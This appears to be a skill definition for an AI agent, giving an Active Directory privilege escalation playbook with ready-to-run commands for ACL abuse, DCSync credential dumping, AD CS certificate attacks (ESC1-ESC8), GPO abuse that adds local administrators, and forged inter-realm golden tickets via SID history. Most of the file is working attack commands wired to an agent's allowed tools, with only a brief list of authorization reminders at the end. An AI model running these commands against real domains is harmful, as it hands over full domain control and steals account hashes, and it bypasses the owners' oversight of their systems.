---
name: hunt-ad-privesc
description: >
  Active Directory privilege escalation: ACL
  abuse, DCSync, GPO abuse, AD CS (ESC1-ESC8),
  AdminSDHolder, SID History, forest trust
  abuse. Refined 0 times.
allowed_tools:
  - Bash(dacledit*:*, bloodyAD*:*, secretsdump*:*,
    certipy*:*, ldapsearch:*, crackmapexec:*,
    netexec:*, owneredit*:*, addcomputer*:*,
    rbcd*:*, getST*:*, bloodhound*:*)
  - Read
  - Grep
  - Glob
  - WebSearch
when_to_use: >
  Privilege escalation within AD. Triggers:
  "AD privesc", "escalate privileges",
  "ACL abuse", "DCSync", "GPO abuse",
  "AD CS attack", "ESC1", "ESC8",
  "AdminSDHolder", "domain admin path"
argument-hint: "[domain/user:pass@DC_IP]"
---

# Hunt: AD Privilege Escalation

## Success Rate
- Times used: 0
- Vulns found: 0
- Last refined: N/A
- Avg severity: Critical
- Avg bounty: $10,000 - $50,000

## Goal
Escalate from low-privilege domain user
to Domain Admin / Enterprise Admin through
AD misconfigurations.

## Technique

### Step 1: Map ACL Attack Paths
```bash
# BloodHound — best for automated path finding
bloodhound-python -u user -p password \
  -d domain.local -dc dc01.domain.local \
  -c All --zip

# Upload to BloodHound, then query:
# "Shortest Path to Domain Admin"
# "Find All Kerberoastable Users"
# "Find Principals with DCSync Rights"

# Manual ACL checks with dacledit
dacledit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -target "Domain Admins" \
  -action read

# Check your own outbound rights
dacledit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -principal user \
  -action read
```

**Success criteria**: Full ACL map showing
paths from current user to DA.

### Step 2: ACL-Based Escalation

**GenericAll on User → Reset Password**:
```bash
# Reset target user password
net rpc password TARGET_USER NewP@ss123 \
  -U DOMAIN/user%password -S DC_IP

# Or via rpcclient
rpcclient -U "DOMAIN/user%password" DC_IP \
  -c "setuserinfo2 TARGET_USER 23 NewP@ss123"
```

**GenericWrite on User → Targeted Kerberoast**:
```bash
# Set SPN on target user → Kerberoast them
bloodyAD -u user -p password -d domain.local \
  --host DC_IP set object TARGET_USER \
  servicePrincipalName -v "MSSQLSvc/fake.domain.local"

# Kerberoast the target
GetUserSPNs.py DOMAIN/user:password \
  -dc-ip DC_IP -request \
  -target-user TARGET_USER

# Clean up: remove SPN after
bloodyAD -u user -p password -d domain.local \
  --host DC_IP set object TARGET_USER \
  servicePrincipalName
```

**WriteDACL → Grant DCSync**:
```bash
dacledit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -target-dn "DC=domain,DC=local" \
  -action write -rights DCSync \
  -principal user

# Now DCSync
secretsdump.py DOMAIN/user:password@DC_IP \
  -just-dc-ntlm
```

**WriteOwner → Take Ownership**:
```bash
owneredit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -target "Domain Admins" \
  -new-owner user \
  -action write

# Now you own the group → WriteDACL → AddMember
dacledit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -target "Domain Admins" \
  -action write -rights FullControl \
  -principal user
```

**AddMember → Direct Group Join**:
```bash
net rpc group addmem "Domain Admins" user \
  -U DOMAIN/user%password -S DC_IP
```

**Success criteria**: Privilege escalated
via ACL abuse.

### Step 3: AD CS Attacks (ESC1-ESC8)
```bash
# Enumerate vulnerable templates
certipy find -u user@domain.local \
  -p password -dc-ip DC_IP -vulnerable

# ESC1: Enrollee specifies SAN
#   → request cert as Administrator
certipy req -u user@domain.local -p password \
  -ca CA_NAME -template VULN_TEMPLATE \
  -upn administrator@domain.local \
  -dc-ip DC_IP

# ESC2: Any Purpose template
#   → same as ESC1
certipy req -u user@domain.local -p password \
  -ca CA_NAME -template VULN_TEMPLATE \
  -upn administrator@domain.local

# ESC3: Enrollment Agent template
#   → enroll on behalf of others
certipy req -u user@domain.local -p password \
  -ca CA_NAME -template AGENT_TEMPLATE
certipy req -u user@domain.local -p password \
  -ca CA_NAME -template USER_TEMPLATE \
  -on-behalf-of "domain\\administrator" \
  -pfx agent.pfx

# ESC4: Vulnerable template ACLs
#   → modify template → make it ESC1
certipy template -u user@domain.local \
  -p password -template VULN_TEMPLATE \
  -save-old -dc-ip DC_IP

# ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2
#   → any template becomes ESC1
certipy req -u user@domain.local -p password \
  -ca CA_NAME -template User \
  -upn administrator@domain.local

# ESC7: CA admin → manage certificates
#   → approve pending requests
certipy ca -u user@domain.local -p password \
  -ca CA_NAME -issue-request REQUEST_ID

# ESC8: HTTP enrollment → NTLM relay
#   (see hunt-coercion)
ntlmrelayx.py \
  -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Authenticate with obtained certificate
certipy auth -pfx administrator.pfx \
  -dc-ip DC_IP
```

**Success criteria**: Certificate obtained
for privileged account. Authentication
as Domain Admin via PKINIT.

### Step 4: GPO Abuse
```bash
# Find writable GPOs
# BloodHound: "Find GPO Controllers"

# Check GPO permissions
dacledit.py DOMAIN/user:password \
  -dc-ip DC_IP \
  -target-dn "CN={GPO_GUID},CN=Policies,CN=System,DC=domain,DC=local" \
  -action read

# If writable → modify GPO for code execution
# Add scheduled task or startup script

# pygpoabuse
pygpoabuse.py DOMAIN/user:password \
  -gpo-id GPO_GUID \
  -command "net localgroup Administrators user /add" \
  -dc DC_IP
```

**Success criteria**: GPO modified to
execute attacker commands on target machines.

### Step 5: DCSync
```bash
# If you have Replicating Directory Changes
# + Replicating Directory Changes All:
secretsdump.py DOMAIN/user:password@DC_IP \
  -just-dc-ntlm

# Specific users
secretsdump.py DOMAIN/user:password@DC_IP \
  -just-dc-user krbtgt
secretsdump.py DOMAIN/user:password@DC_IP \
  -just-dc-user Administrator
```

**Success criteria**: krbtgt NTLM hash
extracted → Golden Ticket capability.

### Step 6: Forest / Trust Abuse
```bash
# Enumerate trusts
ldapsearch -x -H ldap://DC_IP \
  -b "CN=System,DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(objectClass=trustedDomain)" \
  cn trustDirection trustType \
  trustAttributes

# Inter-realm Golden Ticket (child → parent)
# Requires child domain krbtgt + trust key
secretsdump.py DOMAIN/admin:password@DC_IP \
  -just-dc-user "CHILD$/PARENT$"

# SID History injection
ticketer.py -nthash KRBTGT_HASH \
  -domain-sid S-1-5-21-CHILD \
  -domain child.domain.local \
  -extra-sid S-1-5-21-PARENT-519 \
  Administrator
# -519 = Enterprise Admins SID
```

**Success criteria**: Cross-domain access
achieved via trust abuse.

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| ESC1 template | AD CS with misconfigured templates | 10 |
| WriteDACL on domain | ACL misconfiguration | 10 |
| GenericAll on DA user | Direct escalation | 10 |
| ESC8 + PetitPotam | AD CS with HTTP enrollment | 10 |
| GPO write access | GPO linked to DA machines | 9 |
| Unconstrained deleg + coerce | Legacy delegation | 9 |
| SID History (child→parent) | Multi-domain forest | 8 |

## False Positive Filters
- Protected Users group: members resist
  credential theft (no NTLM, no delegation)
  → check group membership before planning
- Tiered admin model: DA accounts may only
  log into DCs → lateral movement limited
- PAW (Privileged Access Workstations): may
  block attack paths → check for network
  segmentation
- Credential Guard: LSASS protected → no
  NTLM hash dump from memory
- gMSA/FGPP: passwords may be uncrackable

## Safety Rails
- Authorized internal pentest only
- Don't modify production GPOs without
  explicit authorization
- Clean up ACL changes after testing
- Don't DCSync in production without
  explicit permission
- SID History injection can break trusts
  → confirm with client
- Document every privilege change

## Changelog
- Initial creation: ACL abuse, AD CS
  (ESC1-ESC8), GPO, DCSync, trust abuse
